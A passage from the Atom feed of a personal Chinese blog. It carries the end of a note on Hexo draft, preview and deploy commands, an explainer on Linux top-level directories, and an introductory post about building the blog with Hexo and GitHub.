class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new draft &lt;title&gt;</span><br></pre></td></tr></table></figure><p>如果你从未使用过草稿功能，这条指令会自动在博客文件夹下的<code>source文件夹</code>内创建一个<code>_draft文件夹</code>，以后你创建的草稿都会被保存到这个文件夹下。同时这条指令也是创建草稿的命令。<code>title</code>标题如果有空格也是要用引号括起来的。</p><p>然后你就可以到<code>_draft</code>文件里用编辑器编辑文件。</p><h1 id="发表草稿"><a class="markdownIt-Anchor" href="#发表草稿"></a> 发表草稿</h1><p>在命令行中输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>在编辑完文件后，就要发表文章，就是把草稿变成新文章，实际上是将草稿文件从<code>source/_draft</code>移动到<code>source/_posts</code>。<code>layout</code>默认就是<code>source/_posts</code>，<code>filename</code>是你要发表的文件名。如果你是按照上面创建的草稿，那<code>filename</code>就是<code>title</code>。</p><h1 id="预览文章"><a class="markdownIt-Anchor" href="#预览文章"></a> 预览文章</h1><p>在命令行中输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><code>hexo g</code>是<code>hexo generate</code>的缩写，生成静态文件。</p><p><code>hexo s</code>是<code>hexo server</code>的缩写，启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code></p><p>在将文章上传到网站前，我们要想预览一下效果，看看文章在网站上好不好看，排版是否清晰，就输入上面两条指令先进行本地渲染。然后再浏览器中输入上面的网址，就能访问本地服务器来预览网站了。</p><h1 id="发表文章"><a class="markdownIt-Anchor" href="#发表文章"></a> 发表文章</h1><p>在命令行中输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p><code>hexo d</code>是<code>hexo deploy</code>的缩写，部署网站，即把文章上传到网站中。</p><blockquote><p><strong>参考链接</strong></p><ul><li><a href="https://hexo.io/zh-cn/docs/">hexo官方文档</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;创建新文章&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#创建新文章&quot;&gt;&lt;/a&gt; 创建新文章&lt;/h1&gt;
&lt;p&gt;在命令行中输入：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="hexo" scheme="https://www.rgzzplus.com/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>Linux二级目录</title>
    <link href="https://www.rgzzplus.com/2022/03/13/linux%E4%BA%8C%E7%BA%A7%E7%9B%AE%E5%BD%95/"/>
    <id>https://www.rgzzplus.com/2022/03/13/linux%E4%BA%8C%E7%BA%A7%E7%9B%AE%E5%BD%95/</id>
    <published>2022-03-13T09:37:43.000Z</published>
    <updated>2022-03-13T09:49:08.227Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux二级目录"><a class="markdownIt-Anchor" href="#linux二级目录"></a> Linux二级目录</h1><ul><li>/bin    存放二进制<strong>可执行文件</strong>，‘binary’ 二进制</li><li>/sbin    存放超级管理员可执行的一些<strong>权限和命令</strong>，‘system binary’</li><li>/boot    存放Linux<strong>系统启动的文件</strong>，启动配置以及内核的镜像 ‘boot’ 引导</li><li>/dev    存放系统下的所有<strong>设备文件</strong>，‘device’ 设备</li><li>/etc    存放<strong>系统配置文件</strong>，意思是等等，<strong>etc来源</strong>见文末</li><li>/home    <strong>普通用户家目录</strong> 类似 windows 的 c:user 目录</li><li>/lib    存放系统使用<strong>函数库</strong>的目录，‘library’ 图书馆，库</li><li>/media    <strong>软盘</strong>或者<strong>光盘</strong>等的<strong>挂载点</strong>，‘media’ 媒体，介质</li><li>/mnt    <strong>硬盘</strong>默认<strong>挂载目录</strong>，‘mount’ 嵌入</li><li>/opt    自定义(第三方)<strong>软件安装位置</strong>，‘optional’ 可选择</li><li>/proc    一个<strong>虚拟的文件系统</strong>(只存在内存中，不是实际贮存在磁盘上的)，包括被某些程序使用的<strong>系统信息</strong>，‘process’ 进程</li><li>/root    <strong>超级用户家目录</strong>，‘root’ 根,(注:它不是系统的根&quot;/&quot; )</li><li>/run    <strong>运行</strong>时的一些<strong>临时文件</strong>，‘run’ 运行</li><li>/srv    存放<strong>服务</strong>启动后所需<strong>数据</strong>，‘service’ 服务</li><li>/sys    存放<strong>系统内核信息</strong>文件，‘system’ 系统</li><li>/tmp    <strong>系统临时文件</strong>目录，<strong>重启清除</strong>，‘temporary’ 临时的</li><li>/usr    操作系统软件资源所放置的目录，即<strong>系统默认软件放置位置</strong>，‘Unix Software Resource’</li><li>/var    系统产生<strong>经常变化的文件</strong>目录，‘variable’ 可变的</li></ul><p>“<strong>etc来源</strong>”: etc不是什么缩写，是and so on的意思，来源于法语的 et cetera 翻译成中文就是 等等 的意思. 至于为什么在/etc下面存放配置文件， 按照原始的UNIX的说法 ( Linux文件结构参考UNIX的教学实现MINIX ) 这下面放的都是一堆零零碎碎的东西, 就叫etc, 这其实是个历史遗留.这个是来源于拉丁语全称etcetera.   n.等等之人（或物），附加的人（或物）；加s：附加（或额外）的项目；零星杂物。或者分开的et cetera, adv. 等等，以及其他等等（略作etc.或＆c.）但得注意，人名后不宜用，要用and others。这个目录在LINUX里很重要哦，里面装的都是些杂七杂八的配置文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux二级目录&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#linux二级目录&quot;&gt;&lt;/a&gt; Linux二级目录&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;/bin    存放二进制&lt;strong&gt;可执行文件&lt;/strong&gt;，‘binary’ </summary>
      
    
    
    
    <category term="学习笔记" scheme="https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.rgzzplus.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>起源</title>
    <link href="https://www.rgzzplus.com/2022/03/11/hello-world/"/>
    <id>https://www.rgzzplus.com/2022/03/11/hello-world/</id>
    <published>2022-03-11T05:26:57.197Z</published>
    <updated>2022-03-11T11:16:41.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="welcome-to-my-blog"><a class="markdownIt-Anchor" href="#welcome-to-my-blog"></a> Welcome to my Blog.</h1><p>我是人工智障，关于博客，早在高中，我就有要做一个属于我自己的博客的想法。只不过那时迫于学业压力，我一直把这个想法埋藏在心底。后来，我也尝试过，限于能力和方法，始终没能做出东西。</p><p>后来我终于找到了正确的建站方法，使用 hexo + github 的方法终于把博客给搭建了起来。当然，也只是成功搭建了起来，由于不熟悉 hexo和 github 我也走了不少弯路，配置和文件管理一片混乱，使得我不得不删库重建。前前后后一共建了 6 个本地库和 2 个远程库，中间也熬了一周的夜，反复琢磨。有时上课也不得闲，都想着怎么消除 Bug。</p><p>自己独立搭建博客，还是很痛苦的，出了 Bug ，没人指导，即使你看不懂，你还是要硬着头皮上，熬夜修 Bug 那是常态。有时，碰上一些实在无法解决的 Bug ，你就不得不从头开始 （搭建博客时，Git用的很烂）。</p><h2 id="经验与教训"><a class="markdownIt-Anchor" href="#经验与教训"></a> 经验与教训</h2><p>下面是我搭建博客总结的一些经验：</p><ol><li>一定要单步调试，一定要单步调试，一定要单步调试，重要的话说 3 遍，单步调试，能很轻易的让你发现错误源头，解决起来也很方便。</li><li>看官方文档，就拿 hexo 举例吧，最开始我是看 CSDN 上别人的博文使用 hexo 的，但是那些博文质量参差不齐，大多数都是基于官方文档总结的，有的甚至有错误，我就是踩了坑，才删了那么多库。</li><li>使用别人的主题一定要看 <a href="http://README.md">README.md</a> 文件，这里面基本涵盖了如何安装和使用的详细步骤，至于为什么不看别人的总结，理由同上第二条。</li><li>最后，耐心，耐心，再耐心，仔细，仔细，再仔细。</li></ol><p>如果你们对搭建博客感兴趣，就在留言区告诉我吧！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;welcome-to-my-blog&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#welcome-to-my-blog&quot;&gt;&lt;/a&gt; Welcome to my Blog.&lt;/h1&gt;
&lt;p&gt;我是人工智障，关于博客，早在高中，我就有要做一</summary>
      
    
    
    
    <category term="个人" scheme="https://www.rgzzplus.com/categories/%E4%B8%AA%E4%BA%BA/"/>
    
    
    <category term="杂谈" scheme="https://www.rgzzplus.com/tags/%E6%9D%82%E8%B0%88/"/>
    
    <category term="心路" scheme="https://www.rgzzplus.com/tags/%E5%BF%83%E8%B7%AF/"/>
    
  </entry>
  
</feed>
